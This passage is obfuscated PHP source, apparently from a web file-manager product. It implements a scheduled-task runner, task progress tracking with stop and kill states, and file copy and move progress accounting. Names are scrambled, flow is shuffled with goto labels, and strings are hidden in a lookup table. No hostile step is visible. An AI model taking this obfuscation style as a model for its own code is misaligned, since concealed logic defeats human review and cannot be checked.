} private static function taskRunAll() { $Aª•˜¢«Ø´ =& $_SERVER[Æ]; $e¦ß¬ÀÒ¬á = Model($Aª•˜¢«Ø´[1405])->listData(); $aÏ‘šÉâš = count($e¦ß¬ÀÒ¬á); for ($DªÒ¡©İ˜Æ = 0; $DªÒ¡©İ˜Æ < $aÏ‘šÉâš; $DªÒ¡©İ˜Æ++) { $fËñôÊÙ£ = $e¦ß¬ÀÒ¬á[$DªÒ¡©İ˜Æ]; if ($fËñôÊÙ£[$Aª•˜¢«Ø´[1406]] != $Aª•˜¢«Ø´[83]) { continue; } if (!self::taskTimeCheck($fËñôÊÙ£)) { continue; } self::taskRun($fËñôÊÙ£); } Hook::trigger($Aª•˜¢«Ø´[1407]); } private static function taskTimeCheck($FÖÇèÎ©Í) { goto F„¢Ù”íÚ; F„¢Ù”íÚ: $F´ğÖµÃËâ =& $_SERVER[Æ]; $f™Ë¸ßŠ½ = json_decode($FÖÇèÎ©Í[$F´ğÖµÃËâ[190]], !0); $AØÒ„¤’ = intval($FÖÇèÎ©Í[$F´ğÖµÃËâ[1399]]); goto b³ªÂ¾ä™Ë; C¨£íÆƒÃÒ: switch ($f™Ë¸ßŠ½[$F´ğÖµÃËâ[29]]) { case $F´ğÖµÃËâ[1414]: if (time() - $AØÒ„¤’ < 3600 * 24 * 30) { return !1; } if ($f™Ë¸ßŠ½[$F´ğÖµÃËâ[1414]] == date($F´ğÖµÃËâ[1415]) && $bãÏƒèÀ£ö) { return !0; } break; case $F´ğÖµÃËâ[1416]: if (time() - $AØÒ„¤’ < 3600 * 24 * 7) { return !1; } $fÀá˜Òµ÷Û = date($F´ğÖµÃËâ[1417]) == 0 ? 7 : date($F´ğÖµÃËâ[1417]); if ($f™Ë¸ßŠ½[$F´ğÖµÃËâ[1416]] == $fÀá˜Òµ÷Û && $bãÏƒèÀ£ö) { return !0; } break; case $F´ğÖµÃËâ[1409]: if (time() - $AØÒ„¤’ < 3600 * 24) { return !1; } if ($bãÏƒèÀ£ö) { return !0; } break; case $F´ğÖµÃËâ[1418]: if (time() - $AØÒ„¤’ >= floatval($f™Ë¸ßŠ½[$F´ğÖµÃËâ[1418]]) * 60) { return !0; } break; default: break; } return !1; goto d†ƒãë‚½ƒ; b³ªÂ¾ä™Ë: $f¦¦«›óé = strtotime($F´ğÖµÃËâ[1408] . $f™Ë¸ßŠ½[$F´ğÖµÃËâ[1409]] . $F´ğÖµÃËâ[1410]) - strtotime($F´ğÖµÃËâ[1411]); $EòíŸ†¤¢ö = time() - strtotime(date($F´ğÖµÃËâ[1412]) . $F´ğÖµÃËâ[1413]); $bãÏƒèÀ£ö = $EòíŸ†¤¢ö >= $f¦¦«›óé && $EòíŸ†¤¢ö <= $f¦¦«›óé + 3600; goto C¨£íÆƒÃÒ; d†ƒãë‚½ƒ: } public static function taskRun($CäŒ£Éº¦Ì) { goto BÕĞë÷³ê‚; BÕĞë÷³ê‚: $A—¯ğãè =& $_SERVER[Æ]; self::log($A—¯ğãè[1419] . $CäŒ£Éº¦Ì[$A—¯ğãè[367]] . $A—¯ğãè[1420] . $CäŒ£Éº¦Ì[$A—¯ğãè[28]] . $A—¯ğãè[1421] . $CäŒ£Éº¦Ì[$A—¯ğãè[1422]]); Model($A—¯ğãè[1405])->run($CäŒ£Éº¦Ì[$A—¯ğãè[367]]); goto E°Ä®‚ß“ç; E°Ä®‚ß“ç: $eíÂåáİ = timeFloat(); $b¡Ïç¼™Äâ = $A—¯ğãè[33]; switch ($CäŒ£Éº¦Ì[$A—¯ğãè[29]]) { case $A—¯ğãè[295]: $d»ÇÃŠê‡ï = url_request($CäŒ£Éº¦Ì[$A—¯ğãè[1422]], $A—¯ğãè[216], !1, !1, !1, !1, 5); $b¡Ïç¼™Äâ = strlen($d»ÇÃŠê‡ï); break; case $A—¯ğãè[215]: $b¡Ïç¼™Äâ = Hook::apply($CäŒ£Éº¦Ì[$A—¯ğãè[1422]]); default: break; } goto F‘ä¦¥¦İ; F‘ä¦¥¦İ: Model($A—¯ğãè[1423])->add(array($A—¯ğãè[1424] => $A—¯ğãè[33], $A—¯ğãè[1425] => $A—¯ğãè[468], $A—¯ğãè[29] => $A—¯ğãè[1426] . $CäŒ£Éº¦Ì[$A—¯ğãè[367]], $A—¯ğãè[1427] => json_encode(array($A—¯ğãè[28] => $CäŒ£Éº¦Ì[$A—¯ğãè[28]], $A—¯ğãè[1428] => timeFloat() - $eíÂåáİ, $A—¯ğãè[281] => $b¡Ïç¼™Äâ)))); self::log($A—¯ğãè[1429] . $CäŒ£Éº¦Ì[$A—¯ğãè[367]] . $A—¯ğãè[1430] . $b¡Ïç¼™Äâ); return !0; goto c²øå‹¶; c²øå‹¶: } private static function valueGet($B¶§³™ÉÜ´) { $a™‡½„‡ãÆ =& $_SERVER[Æ]; $b‰Øç³®ê = $a™‡½„‡ãÆ[1431]; $e‰àâùÊ® = Model($a™‡½„‡ãÆ[1432])->get($B¶§³™ÉÜ´, $b‰Øç³®ê); if (is_null($e‰àâùÊ®)) { Model($a™‡½„‡ãÆ[1432])->set($a™‡½„‡ãÆ[1403], 10, $b‰Øç³®ê); Model($a™‡½„‡ãÆ[1432])->set($a™‡½„‡ãÆ[687], $a™‡½„‡ãÆ[83], $b‰Øç³®ê); Model($a™‡½„‡ãÆ[1432])->set($a™‡½„‡ãÆ[1398], $a™‡½„‡ãÆ[468], $b‰Øç³®ê); $e‰àâùÊ® = Model($a™‡½„‡ãÆ[1432])->get($B¶§³™ÉÜ´, $b‰Øç³®ê); } return $e‰àâùÊ®; } private static function valueSet($BÚ‰‹‰§, $bØ‹¬™ß½á) { $B¹èÄÎ¦Ùç =& $_SERVER[Æ]; return Model($B¹èÄÎ¦Ùç[1432])->set($BÚ‰‹‰§, $bØ‹¬™ß½á, $B¹èÄÎ¦Ùç[1431]); } protected static function log($D·˜÷«‰ÂÏ) { write_log($D·˜÷«‰ÂÏ, $_SERVER[Æ][1433]); } private static function cacheClear() { $C™¸‚ùÜÏÛ =& $_SERVER[Æ]; $E°šÍ†Š”œ = Model($C™¸‚ùÜÏÛ[1432])->cacheKey($C™¸‚ùÜÏÛ[1431]); Cache::clearMemory($E°šÍ†Š”œ); } } goto f¿Æ¾¨¶¦é; f¿Æ¾¨¶¦é: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($B©ªø¶Õ­’, $fÅÕó®¯òÊ = '', $c‚ìˆ›¹Ñ§ = 0, $eÑöÆ»Şèª = '') { goto b´ÆÌá½é‘; b´ÆÌá½é‘: $DîÄäÚˆ¬¢ =& $_SERVER[Æ]; if (self::get($B©ªø¶Õ­’)) { return; } $this->task = array($DîÄäÚˆ¬¢[367] => $B©ªø¶Õ­’, $DîÄäÚˆ¬¢[1434] => USER_ID, $DîÄäÚˆ¬¢[1340] => $eÑöÆ»Şèª, $DîÄäÚˆ¬¢[29] => $fÅÕó®¯òÊ, $DîÄäÚˆ¬¢[979] => $DîÄäÚˆ¬¢[33], $DîÄäÚˆ¬¢[977] => $c‚ìˆ›¹Ñ§, $DîÄäÚˆ¬¢[989] => 0, $DîÄäÚˆ¬¢[1435] => 0, $DîÄäÚˆ¬¢[1436] => 0, $DîÄäÚˆ¬¢[1437] => timeFloat(), $DîÄäÚˆ¬¢[1438] => 0, $DîÄäÚˆ¬¢[1439] => 0, $DîÄäÚˆ¬¢[1440] => 0, $DîÄäÚˆ¬¢[1441] => 0, $DîÄäÚˆ¬¢[687] => $DîÄäÚˆ¬¢[1398]); goto b¬§à Ó¾; F÷îáåéæ«: Hook::trigger($DîÄäÚˆ¬¢[1445], $this->task); $this->task[$DîÄäÚˆ¬¢[1439]] = timeFloat(); goto e»¬¸ïÓ£Ô; b¬§à Ó¾: Hook::bind($DîÄäÚˆ¬¢[1400], array($this, $DîÄäÚˆ¬¢[1442])); Hook::bind($DîÄäÚˆ¬¢[1443], array($this, $DîÄäÚˆ¬¢[1444])); $this->startAfter(); goto F÷îáåéæ«; e»¬¸ïÓ£Ô: } public function end() { goto A‹øËµ‰ã‰; B‹Œ¥“ä²³: $B‘ä‡ãÆ¾ = timeFloat() - $this->task[$A®¬ÙØĞ[1437]]; self::log($A®¬ÙØĞ[1446] . $this->task[$A®¬ÙØĞ[367]] . $A®¬ÙØĞ[1447] . $B‘ä‡ãÆ¾ . $A®¬ÙØĞ[1448]); Hook::unbind($A®¬ÙØĞ[1400], array($this, $A®¬ÙØĞ[1442])); goto e²²§…º´¯; e²²§…º´¯: Hook::unbind($A®¬ÙØĞ[1443], array($this, $A®¬ÙØĞ[1444])); $this->endAfter(); $this->task = !1; goto e¿¬İ¥È; A‹øËµ‰ã‰: $A®¬ÙØĞ =& $_SERVER[Æ]; if (!$this->task) { return; } if ($this->task[$A®¬ÙØĞ[1439]]) { self::valueSet($this->task[$A®¬ÙØĞ[367]], !1); } goto B‹Œ¥“ä²³; e¿¬İ¥È: } public function update($FÒÄ¢ñ‹ = 0) { goto cÀÀª‘Î¤¸; D•›ÎÎÅ‰Ô: $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [687]] = $E²ÓÑ«ƒÚ ? $E²ÓÑ«ƒÚ : $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [687]]; $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1440]] = $b‹ËÍÆİ[$Aİ¶¥¾‰¶ [1440]] ? $b‹ËÍÆİ[$Aİ¶¥¾‰¶ [1440]] : 0; $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1439]] = timeFloat(); goto a–Áİ‰áÊ; B«•ë¿—¢î: $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [989]] += $FÒÄ¢ñ‹; $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1438]] = timeFloat(); if ($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [977]]) { if ($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [977]] < $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [989]]) { $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [977]] = $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [989]]; } $bÚ¤¤óí§„ = timeFloat() - $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1437]] - $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1440]]; $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1435]] = $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [989]] / $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [977]]; $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1436]] = $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [989]] / $bÚ¤¤óí§„; if ($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1435]] > 0) { $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1441]] = $bÚ¤¤óí§„ * (1 - $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1435]]) / $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1435]]; } $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1441]] = $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1441]] <= 0 ? 0 : $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1441]]; } goto f¾¶ËöÆ¡; cÀÀª‘Î¤¸: $Aİ¶¥¾‰¶  =& $_SERVER[Æ]; $a­óÌ›†ÇÖ =& $this->task; if (!$a­óÌ›†ÇÖ) { return; } goto B«•ë¿—¢î; a–Áİ‰áÊ: Hook::trigger($Aİ¶¥¾‰¶ [1452], $a­óÌ›†ÇÖ); self::valueSet($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [367]], $a­óÌ›†ÇÖ); goto aÆôßĞëÆ; BÒğºØœ”Ë: $b‹ËÍÆİ = self::get($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [367]]); $E²ÓÑ«ƒÚ = $b‹ËÍÆİ[$Aİ¶¥¾‰¶ [687]]; if ($E²ÓÑ«ƒÚ == self::STATYS_KILL) { $f„Æ·ì…ÌØ = array($Aİ¶¥¾‰¶ [1449] => LNG($Aİ¶¥¾‰¶ [1450]), $Aİ¶¥¾‰¶ [1032] => !1); Cache::set($Aİ¶¥¾‰¶ [1451] . $this->task[$Aİ¶¥¾‰¶ [367]], $f„Æ·ì…ÌØ, 30); $this->end(); die; } else { if ($E²ÓÑ«ƒÚ == self::STATYS_STOP) { $E•¤ò™“˜ç = 2; $b‹ËÍÆİ[$Aİ¶¥¾‰¶ [1440]] += $E•¤ò™“˜ç; self::valueSet($a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [367]], $b‹ËÍÆİ); sleep($E•¤ò™“˜ç); $this->update(); return; } } goto D•›ÎÎÅ‰Ô; f¾¶ËöÆ¡: $this->updateAfter(); $d•ÑğğËæ¹ = 0.2; if (timeFloat() - $a­óÌ›†ÇÖ[$Aİ¶¥¾‰¶ [1439]] < $d•ÑğğËæ¹) { return; } goto BÒğºØœ”Ë; aÆôßĞëÆ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($aˆ¶óÓË£¥) { $Eğ•¬‘³Á” =& $_SERVER[Æ]; Cache::set($Eğ•¬‘³Á”[1451] . $this->task[$Eğ•¬‘³Á”[367]], $aˆ¶óÓË£¥, 60); return $aˆ¶óÓË£¥; } public static function get($f§ĞÃ«óÈ) { return self::valueGet($f§ĞÃ«óÈ); } public static function listData() { $dâÓ™‹å¨® = self::valueGet(); return array_sort_by($dâÓ™‹å¨®, $_SERVER[Æ][1437], !0); } public static function kill($Eæ„¥ëÇ) { return self::changeStatus($Eæ„¥ëÇ, self::STATYS_KILL); } public static function stop($FÊó„¾¯ˆ) { return self::changeStatus($FÊó„¾¯ˆ, self::STATYS_STOP); } public static function restart($F…èÉÍÁÛ) { return self::changeStatus($F…èÉÍÁÛ, self::STATYS_RUNNING); } public static function killAll() { $FÄğ•´ßîÙ =& $_SERVER[Æ]; $DëéÎáñÊã = self::listData(); foreach ($DëéÎáñÊã as $d÷Ì‹‡±·) { self::kill($d÷Ì‹‡±·[$FÄğ•´ßîÙ[367]]); } sleep(2); foreach ($DëéÎáñÊã as $d÷Ì‹‡±·) { self::valueSet($d÷Ì‹‡±·[$FÄğ•´ßîÙ[367]], !1); } } private static function changeStatus($C°‹Í°¡å¼, $FƒÉÛ‡åöÍ) { goto Aİëù²”ò; Aİëù²”ò: $d¹ùê­æ¥è =& $_SERVER[Æ]; $fÀ°»µÂ‡ˆ = self::valueGet($C°‹Í°¡å¼); if (!$fÀ°»µÂ‡ˆ) { return !1; } goto dµ©è©¢ã; D´ªÉæ‡…ù: return !0; goto F§·¿¢É‘‘; dµ©è©¢ã: $fÀ°»µÂ‡ˆ[$d¹ùê­æ¥è[687]] = $FƒÉÛ‡åöÍ; self::valueSet($C°‹Í°¡å¼, $fÀ°»µÂ‡ˆ); self::log($d¹ùê­æ¥è[1453] . $fÀ°»µÂ‡ˆ[$d¹ùê­æ¥è[367]] . $d¹ùê­æ¥è[1454] . $FƒÉÛ‡åöÍ); goto D´ªÉæ‡…ù; F§·¿¢É‘‘: } public static function valueGet($b¯Ä±¼÷ìƒ = false) { $DË–¤„ºéí =& $_SERVER[Æ]; if ($b¯Ä±¼÷ìƒ) { $d†ó™ãÁ¥– = Model($DË–¤„ºéí[399])->where(array($DË–¤„ºéí[89] => $b¯Ä±¼÷ìƒ, $DË–¤„ºéí[29] => $DË–¤„ºéí[1455]))->find(); return $d†ó™ãÁ¥– ? json_decode($d†ó™ãÁ¥–[$DË–¤„ºéí[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($a›ÖÌåÛŞï = false) { goto A…Æƒ¸õï…; E¥ø·ê‚ïè: $bÀˆ”Œ°¥ = Model($e¯‰âƒ©õ×[399])->where($c¶›¯Ëã›ë)->select(); $bÀˆ”Œ°¥ = $bÀˆ”Œ°¥ ? $bÀˆ”Œ°¥ : array(); foreach ($bÀˆ”Œ°¥ as $E±ÊáàÕ½‘ => $aÊùÑÊææ­) { $bÀˆ”Œ°¥[$E±ÊáàÕ½‘] = json_decode($aÊùÑÊææ­[$e¯‰âƒ©õ×[359]], !0); } goto f´—ŠµËÌ; A…Æƒ¸õï…: $e¯‰âƒ©õ× =& $_SERVER[Æ]; $c¶›¯Ëã›ë = array($e¯‰âƒ©õ×[29] => $e¯‰âƒ©õ×[1455]); if ($a›ÖÌåÛŞï) { $c¶›¯Ëã›ë[$e¯‰âƒ©õ×[1434]] = $a›ÖÌåÛŞï; } goto E¥ø·ê‚ïè; f´—ŠµËÌ: return $bÀˆ”Œ°¥; goto BÎ¸«ÒÎÕÇ; BÎ¸«ÒÎÕÇ: } public static function valueSet($E·°ëé«õï, $B‘ñŠš‰ä») { goto c•ù«ƒÜ; Eô×Ğ‡¾ˆŞ: if (!$DŸõ¬‚ßíî) { ob_start(); var_dump($B‘ñŠš‰ä»); $eù‰™Ì½Ë = ob_get_clean(); self::log($c±—¨¬¢ÀË[1456] . json_encode_force($eù‰™Ì½Ë)); } if (!$E·°ëé«õï || !$B‘ñŠš‰ä»[$c±—¨¬¢ÀË[367]]) { return !1; } $C–İ»ÒŠ³ğ = array($c±—¨¬¢ÀË[29] => $c±—¨¬¢ÀË[1455], $c±—¨¬¢ÀË[1434] => USER_ID, $c±—¨¬¢ÀË[89] => $E·°ëé«õï, $c±—¨¬¢ÀË[359] => $DŸõ¬‚ßíî); goto Cê±õ‰ğ¾Õ; Cê±õ‰ğ¾Õ: Model($c±—¨¬¢ÀË[399])->add($C–İ»ÒŠ³ğ, array(), !0); goto E°ßç´½é½; c•ù«ƒÜ: $c±—¨¬¢ÀË =& $_SERVER[Æ]; if (!$B‘ñŠš‰ä») { return Model($c±—¨¬¢ÀË[399])->where(array($c±—¨¬¢ÀË[89] => $E·°ëé«õï, $c±—¨¬¢ÀË[29] => $c±—¨¬¢ÀË[1455]))->delete(); } $DŸõ¬‚ßíî = json_encode($B‘ñŠš‰ä»); goto Eô×Ğ‡¾ˆŞ; E°ßç´½é½: } public static function log($C¹›ÄÓ‚˜›) { write_log($C¹›ÄÓ‚˜›, $_SERVER[Æ][1457]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto B®ÏàèÅãÕ; F¦§í•Û‚: Hook::bind($bË¸Û½ö§[1458], array($this, $bË¸Û½ö§[1459])); Hook::bind($bË¸Û½ö§[1460], array($this, $bË¸Û½ö§[1461])); Hook::bind($bË¸Û½ö§[1462], array($this, $bË¸Û½ö§[1463])); goto eÊ§Î©¸ö§; B®ÏàèÅãÕ: $bË¸Û½ö§ =& $_SERVER[Æ]; $AËÀ¨Üè… =& $this->task; $this->sourceCopyFolder = !1; goto F¦§í•Û‚; eÊ§Î©¸ö§: Hook::bind($bË¸Û½ö§[539], array($this, $bË¸Û½ö§[1464])); Hook::bind($bË¸Û½ö§[540], array($this, $bË¸Û½ö§[1465])); Hook::bind($bË¸Û½ö§[542], array($this, $bË¸Û½ö§[1466])); goto aÍ•×ğÉâ; A‡„„­ƒë‹: Hook::bind($bË¸Û½ö§[511], array($this, $bË¸Û½ö§[1467])); Hook::bind($bË¸Û½ö§[513], array($this, $bË¸Û½ö§[1467])); Hook::bind($bË¸Û½ö§[515], array($this, $bË¸Û½ö§[1467])); goto fÒè à„À‰; AÆÂçŒ„ËÛ: $AËÀ¨Üè…[$bË¸Û½ö§[1483]] = 0; $AËÀ¨Üè…[$bË¸Û½ö§[1484]] = 0; if (!$AËÀ¨Üè…[$bË¸Û½ö§[1340]]) { $AËÀ¨Üè…[$bË¸Û½ö§[1340]] = LNG($bË¸Û½ö§[1485]); } goto A†»Ì÷†‚; a¬ˆ¨¼¢è·: Hook::bind($bË¸Û½ö§[1471], array($this, $bË¸Û½ö§[1472])); Hook::bind($bË¸Û½ö§[1473], array($this, $bË¸Û½ö§[1474])); Hook::bind($bË¸Û½ö§[1475], array($this, $bË¸Û½ö§[1476])); goto C÷¨ˆƒ×à; F¼ô­•ìŠ„: $AËÀ¨Üè…[$bË¸Û½ö§[979]] = $bË¸Û½ö§[33]; $AËÀ¨Üè…[$bË¸Û½ö§[1481]] = $bË¸Û½ö§[33]; $AËÀ¨Üè…[$bË¸Û½ö§[1482]] = 0; goto AÆÂçŒ„ËÛ; fÒè à„À‰: Hook::bind($bË¸Û½ö§[1468], array($this, $bË¸Û½ö§[1469])); Hook::bind($bË¸Û½ö§[532], array($this, $bË¸Û½ö§[1470])); $this->sourceModelCopyFlag = !1; goto a¬ˆ¨¼¢è·; aÍ•×ğÉâ: Hook::bind($bË¸Û½ö§[543], array($this, $bË¸Û½ö§[1466])); Hook::bind($bË¸Û½ö§[509], array($this, $bË¸Û½ö§[1467])); Hook::bind($bË¸Û½ö§[506], array($this, $bË¸Û½ö§[1467])); goto A‡„„­ƒë‹; C÷¨ˆƒ×à: $AËÀ¨Üè…[$bË¸Û½ö§[1477]] = LNG($bË¸Û½ö§[1478]); $AËÀ¨Üè…[$bË¸Û½ö§[1479]] = 0; $AËÀ¨Üè…[$bË¸Û½ö§[1480]] = 0; goto F¼ô­•ìŠ„; A†»Ì÷†‚: } protected function endAfter() { goto aœÛêÜåìÌ; Bó´ğ› ™: Hook::unbind($f†½ˆŞˆô[515], array($this, $f†½ˆŞˆô[1467])); Hook::unbind($f†½ˆŞˆô[1468], array($this, $f†½ˆŞˆô[1469])); Hook::unbind($f†½ˆŞˆô[532], array($this, $f†½ˆŞˆô[1470])); goto aÈø®Ş‹¼; D«’…¿Ï¯: Hook::unbind($f†½ˆŞˆô[1462], array($this, $f†½ˆŞˆô[1463])); Hook::unbind($f†½ˆŞˆô[539], array($this, $f†½ˆŞˆô[1464])); Hook::unbind($f†½ˆŞˆô[540], array($this, $f†½ˆŞˆô[1465])); goto F«ƒ©°ÇÒ; Eà¢Ê„§ĞÙ: Hook::unbind($f†½ˆŞˆô[506], array($this, $f†½ˆŞˆô[1467])); Hook::unbind($f†½ˆŞˆô[511], array($this, $f†½ˆŞˆô[1467])); Hook::unbind($f†½ˆŞˆô[513], array($this, $f†½ˆŞˆô[1467])); goto Bó´ğ› ™; aÈø®Ş‹¼: Hook::unbind($f†½ˆŞˆô[1471], array($this, $f†½ˆŞˆô[1472])); Hook::unbind($f†½ˆŞˆô[1473], array($this, $f†½ˆŞˆô[1474])); Hook::unbind($f†½ˆŞˆô[1475], array($this, $f†½ˆŞˆô[1476])); goto a¬œŞÏá™¬; aœÛêÜåìÌ: $f†½ˆŞˆô =& $_SERVER[Æ]; Hook::unbind($f†½ˆŞˆô[1458], array($this, $f†½ˆŞˆô[1459])); Hook::unbind($f†½ˆŞˆô[1460], array($this, $f†½ˆŞˆô[1461])); goto D«’…¿Ï¯; F«ƒ©°ÇÒ: Hook::unbind($f†½ˆŞˆô[542], array($this, $f†½ˆŞˆô[1466])); Hook::unbind($f†½ˆŞˆô[543], array($this, $f†½ˆŞˆô[1466])); Hook::unbind($f†½ˆŞˆô[509], array($this, $f†½ˆŞˆô[1467])); goto Eà¢Ê„§ĞÙ; a¬œŞÏá™¬: } public function copyMoveStart($bëàã½¹ƒ, $b÷Ûà´šª, $fçŸ¢™‹óÆ, $f”éİ“ĞÙÌ) { goto B§‡™Îİ¼¢; f—š¿œŒ»™: if (substr($b÷Ûà´šª, 0, strlen($FƒÎ‡—ï·“)) == $FƒÎ‡—ï·“) { return; } if (substr($f”éİ“ĞÙÌ, 0, strlen($FƒÎ‡—ï·“)) == $FƒÎ‡—ï·“) { return; } $A–İåğß‚µ =& $this->task; goto cÏéÔòÂÍ„; cÏéÔòÂÍ„: $A–İåğß‚µ[$DÂùÜé‰©†[1487]] = KodIO::transferType($bëàã½¹ƒ, $fçŸ¢™‹óÆ); $this->update(); goto e‹§“Â’É˜; B§‡™Îİ¼¢: $DÂùÜé‰©† =& $_SERVER[Æ]; self::log($DÂùÜé‰©†[1486] . $b÷Ûà´šª . $DÂùÜé‰©†[66] . $f”éİ“ĞÙÌ); $FƒÎ‡—ï·“ = rtrim(TEMP_FILES, $DÂùÜé‰©†[8]); goto f—š¿œŒ»™; e‹§“Â’É˜: } public function updateAfter() { goto aÒÔà‡··; aÒÔà‡··: $CÊ¶²ÙÕ« =& $_SERVER[Æ]; $CÇŸÓšæĞŠ =& $this->task; if (!$CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[696]]) { return; } goto fÏŞõ™ÙÖ‹; dÖ‚¢İ…¸¿: $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1435]] = $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1484]] / $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[696]]; if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1435]] > 0) { $c“ô¹ºâ§‘ = timeFloat() - $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1437]] - $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1440]]; $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1441]] = $c“ô¹ºâ§‘ * (1 - $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1435]]) / $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1435]]; } goto eœÃ§ç÷Ã¸; fÏŞõ™ÙÖ‹: if ($this->sourceModelCopyFlag) { return; } if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1487]] == $CÊ¶²ÙÕ«[1094]) { return; } if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1487]] == $CÊ¶²ÙÕ«[1040] || $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1487]] == $CÊ¶²ÙÕ«[103]) { if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1481]]) { $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1484]] = $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1483]] + $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1480]]; } } else { if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1487]] == $CÊ¶²ÙÕ«[1095]) { if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1481]] == $CÊ¶²ÙÕ«[1040]) { $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1484]] = $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1483]] + $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1480]] * 0.5; } else { if ($CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1481]] == $CÊ¶²ÙÕ«[103]) { $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1484]] = $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1483]] + $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1479]] * 0.5 + $CÇŸÓšæĞŠ[$CÊ¶²ÙÕ«[1480]] * 0.5; } } } } goto dÖ‚¢İ…¸¿; eœÃ§ç÷Ã¸: } public function addPath($aÒøøÇçÈ´) { goto CÃÉ÷‡ª‡Ç; dÛÈô‹“: $B·“³’¤© = IO::infoWithChildren($aÒøøÇçÈ´); $fØ•½š¢Ë = $f–×«Êñ[$DÆÆØ‚„Ë¸[1488]] ? $f–×«Êñ[$DÆÆØ‚„Ë¸[1488]][$DÆÆØ‚„Ë¸[1489]] : 0; $f–×«Êñ[$DÆÆØ‚„Ë¸[1488]] = array($DÆÆØ‚„Ë¸[1489] => $fØ•½š¢Ë + 1, $DÆÆØ‚„Ë¸[386] => $B·“³’¤©[$DÆÆØ‚„Ë¸[28]], $DÆÆØ‚„Ë¸[75] => $B·“³’¤©[$DÆÆØ‚„Ë¸[75]], $DÆÆØ‚„Ë¸[466] => $B·“³’¤©[$DÆÆØ‚„Ë¸[466]] ? $B·“³’¤©[$DÆÆØ‚„Ë¸[466]] : $B·“³’¤©[$DÆÆØ‚„Ë¸[75]]); goto F‚Ëºê‘; F‚Ëºê‘: if ($B·“³’¤©[$DÆÆØ‚„Ë¸[29]] == $DÆÆØ‚„Ë¸[167]) { $f–×«Êñ[$DÆÆØ‚„Ë¸[977]] += 1; } else { $f–×«Êñ[$DÆÆØ‚„Ë¸[977]] += $B·“³’¤©[$DÆÆØ‚„Ë¸[80]][$DÆÆØ‚„Ë¸[78]]; if ($B·“³’¤©[$DÆÆØ‚„Ë¸[369]]) { $f–×«Êñ[$DÆÆØ‚„Ë¸[977]] += $B·“³’¤©[$DÆÆØ‚„Ë¸[80]][$DÆÆØ‚„Ë¸[79]] + 1; } } $f–×«Êñ[$DÆÆØ‚„Ë¸[696]] += $B·“³’¤©[$DÆÆØ‚„Ë¸[77]]; $this->update(); goto B¤°³Êá¾æ; CÃÉ÷‡ª‡Ç: $DÆÆØ‚„Ë¸ =& $_SERVER[Æ]; if (!$aÒøøÇçÈ´) { return; } $f–×«Êñ =& $this->task; goto dÛÈô‹“; B¤°³Êá¾æ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($C¥– ¦©‚) { $f­ ´Ã¿î¥ =& $_SERVER[Æ]; $A­’´©°‰æ =& $this->task; $A­’´©°‰æ[$f­ ´Ã¿î¥[1477]] = $C¥– ¦©‚[$f­ ´Ã¿î¥[28]]; $A­’´©°‰æ[$f­ ´Ã¿î¥[979]] = $C¥– ¦©‚[$f­ 